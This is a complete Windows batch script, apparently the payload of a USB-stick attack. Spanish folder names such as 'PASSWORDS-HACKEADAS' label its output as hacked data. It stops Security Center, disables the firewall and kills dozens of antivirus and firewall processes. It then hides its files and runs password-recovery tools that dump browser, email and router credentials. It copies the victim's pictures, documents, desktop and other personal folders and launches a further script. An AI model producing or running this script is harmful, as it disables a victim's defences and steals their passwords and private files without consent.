@echo off

color a & cls


net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
tskill /A 360security*

if exist "27719" (attrib /s /d +s +h 27719)

if exist "rubber-ducky.exe" (attrib /s /d +s +h rubber-ducky.exe)

start 27719\PASSWORDS-HACKEADAS\a.exe /stext 27719\PASSWORDS-HACKEADAS\DUMP\WebBrowserPassView.txt

start 27719\PASSWORDS-HACKEADAS\BrowsingHistoryView.exe /stext 27719\PASSWORDS-HACKEADAS\DUMP\BrowsingHistoryView.txt

start 27719\PASSWORDS-HACKEADAS\mailpv.exe /stext 27719\PASSWORDS-HACKEADAS\DUMP\mailpv.txt

start 27719\PASSWORDS-HACKEADAS\pspv.exe /stext 27719\PASSWORDS-HACKEADAS\DUMP\pspv.txt

start 27719\PASSWORDS-HACKEADAS\RouterPassView.exe /stext 27719\PASSWORDS-HACKEADAS\DUMP\RouterPassView.txt


xcopy   /e   /h   /y   /c   /d        C:\Users\%username%\Pictures       27719\HACKEADO\Imagenes-Hackeadas

cls

xcopy   /e   /h   /y   /c   /d        C:\Users\%username%\Downloads      27719\HACKEADO\Descargas-Hackeadas

cls

xcopy   /e   /h   /y   /c   /d        C:\Users\%username%\Desktop         27719\HACKEADO\Escritorio-Hackeado

cls

xcopy   /e   /h   /y   /c   /d         C:\Users\%username%\Documents       27719\HACKEADO\Documentos-Hackeados

cls

xcopy   /e   /h   /y   /c   /d         C:\Users\%username%\Videos           27719\HACKEADO\Videos-Hackeados

cls

xcopy   /e   /h   /y   /c   /d         C:\Users\%username%\Music            27719\HACKEADO\Musica-Hackeada

cls

start 27719\HACKEADO\Scripts\Script2.vbs

cls & exit